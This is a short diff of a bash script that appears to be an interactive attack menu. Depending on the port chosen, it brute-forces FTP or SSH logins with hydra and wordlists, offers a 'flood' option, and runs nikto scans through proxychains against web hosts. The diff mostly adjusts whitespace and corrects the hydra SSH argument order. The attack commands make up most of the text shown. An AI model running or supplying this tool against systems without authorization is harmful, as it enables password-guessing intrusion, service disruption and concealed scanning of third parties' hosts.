@@ -65,16 +65,16 @@ read -r -p " Choose a port to attack " portresponse
 	read -r -p " Enter hostname without http/s://  " web
                 hydra -C $FTP_WORDLIST $web ftp -t $THREADS -e ns
 ;;
-   	   22)  # If you type 22 Do this attack else do another attack 
+       	    22)  # If you type 22 Do this attack else do another attack 
    	echo "Time for an ssh bruteforce"
-	        hydra -C $SSH_WORDLIST ssh $ip -t $THREADS -e ns
+	        hydra -C $SSH_WORDLIST $ip ssh -t $THREADS -e ns
 
 ;;
-        flood)
+         flood)
 	echo " Flood the bitch " 
 	echo "${flood}"
- ;;
-	  80|443|53)
+;;
+     80|443|53)
 #	echo " Enter hostname "
 	read -r -p " Enter Hostname :" web
 		 /usr/bin/proxychains /usr/bin/perl $niktodir$nikprog -url $web
